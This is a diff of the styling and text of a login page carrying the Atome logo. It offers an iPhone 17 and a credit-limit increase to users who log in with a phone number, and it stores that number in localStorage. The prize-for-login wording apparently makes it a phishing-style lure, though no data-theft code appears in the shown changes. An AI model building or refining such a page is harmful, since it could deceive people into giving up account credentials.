@@ -21,10 +21,7 @@
             overflow-x: hidden;
         }
 
-        /* ============================================
-           MAIN BACKGROUND - atomebg.png
-           No gradient, just the image background
-        ============================================ */
+        /* MAIN BACKGROUND - atomebg.png */
         .bg-theme {
             background-image: url('photos/atomebg.png');
             background-size: cover;
@@ -36,10 +33,7 @@
             position: relative;
         }
 
-        /* ============================================
-           TRANSPARENT CONTAINER - No background, no blur
-           Kita ang atomebg.png sa likod
-        ============================================ */
+        /* Main Container */
         .main-container {
             position: relative;
             z-index: 2;
@@ -52,23 +46,18 @@
             justify-content: center;
         }
 
-        /* ============================================
-           TRANSPARENT GLASS CARD - Semi-transparent
-           Nakikita pa rin ang background image
-        ============================================ */
+        /* SLIGHT TRANSPARENT CONTAINER - mas magaan ang transparency */
         .glass-card {
-            background: rgba(255, 250, 240, 0.88);
-            backdrop-filter: blur(12px);
+            background: rgba(255, 250, 240, 0.75);
+            backdrop-filter: blur(8px);
             border-radius: 52px;
             padding: 32px 28px 44px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.15), 0 4px 12px rgba(255,255,200,0.2);
-            border: 1px solid rgba(255, 248, 225, 0.5);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.12), 0 4px 12px rgba(255,255,200,0.15);
+            border: 1px solid rgba(255, 248, 225, 0.4);
             transition: all 0.3s ease;
         }
 
-        /* ============================================
-           PROMO HEADER - Golden Yellow Accent
-        ============================================ */
+        /* PROMO HEADER */
         .promo-header {
             text-align: center;
             margin-bottom: 28px;
@@ -93,24 +82,26 @@
             font-size: 1.75rem;
         }
         .promo-sub {
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             color: #d46b5e;
-            margin-top: 8px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+            margin-top: 10px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
             font-family: 'Inter', sans-serif;
+            background: rgba(212,107,94,0.12);
+            display: inline-block;
+            padding: 6px 18px;
+            border-radius: 60px;
         }
 
-        /* ============================================
-           STEPS with Emojis - Coral Orange Accent
-        ============================================ */
+        /* STEPS with Emojis */
         .steps-container {
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 0;
             margin-bottom: 28px;
-            background: rgba(255, 245, 235, 0.7);
+            background: rgba(255, 245, 235, 0.6);
             border-radius: 100px;
             padding: 12px 20px;
             border: 1px solid rgba(255, 215, 180, 0.5);
@@ -147,9 +138,7 @@
             font-weight: 600;
         }
 
-        /* ============================================
-           ATOME LOGO - Transparent, No White Background
-        ============================================ */
+        /* ATOME LOGO - Transparent */
         .logo-wrapper {
             display: flex;
             justify-content: center;
@@ -170,9 +159,7 @@
             background: transparent !important;
         }
 
-        /* ============================================
-           PHONE INPUT - Modern Clean Design
-        ============================================ */
+        /* PHONE INPUT */
         .input-field-wrapper {
             margin-bottom: 28px;
         }
@@ -226,9 +213,7 @@
             display: block;
         }
 
-        /* ============================================
-           LOGIN BUTTON - Matte Black + Golden Yellow
-        ============================================ */
+        /* LOGIN BUTTON - Matte Black + Golden Yellow */
         .login-button {
             width: 100%;
             background: #1a1a1a;
@@ -254,9 +239,7 @@
             color: #FFE566;
         }
 
-        /* ============================================
-           HINT MESSAGE - Blush Pink Accent
-        ============================================ */
+        /* HINT MESSAGE */
         .hint-message {
             text-align: center;
             font-size: 0.72rem;
@@ -270,9 +253,7 @@
             font-family: 'Inter', sans-serif;
         }
 
-        /* ============================================
-           TERMS & PRIVACY - Off-white
-        ============================================ */
+        /* TERMS & PRIVACY */
         .terms-row {
             text-align: center;
             font-size: 0.68rem;
@@ -295,9 +276,7 @@
             color: #ff6b4a;
         }
 
-        /* ============================================
-           DASHBOARD PANEL - After Login
-        ============================================ */
+        /* DASHBOARD PANEL */
         .dashboard-area {
             margin-top: 28px;
             border-top: 1px solid rgba(212,107,94,0.2);
@@ -349,9 +328,6 @@
             font-family: 'Inter', sans-serif;
         }
 
-        /* ============================================
-           RESPONSIVE
-        ============================================ */
         @media (max-width: 480px) {
             .glass-card {
                 padding: 24px 20px 36px;
@@ -387,10 +363,10 @@
 <div class="bg-theme">
     <div class="main-container">
         <div class="glass-card">
-            <!-- PROMO HEADER -->
+            <!-- PROMO HEADER - Updated: Login and change your credit limit offer -->
             <div class="promo-header">
                 <div class="promo-title">Win an iPhone 17 & <strong>up to ₱10,000</strong> credit increase limit!</div>
-                <div class="promo-sub">Register for your chance to win</div>
+                <div class="promo-sub">🔐 Login and change your credit limit offer</div>
             </div>
 
             <!-- STEPS with emojis: Login 🔐 | Claim 🎁 | Enjoy Spending 💳 -->
@@ -541,7 +517,7 @@
         refreshUI();
         alert(`✅ Login successful! +63${phoneValue.replace(/\D/g, '')} — you can now smash the egg.`);
         
-        // Optional: Save to localStorage
+        // Save to localStorage
         localStorage.setItem('atomeUser', JSON.stringify({
             phone: phoneValue,
             loggedIn: true,
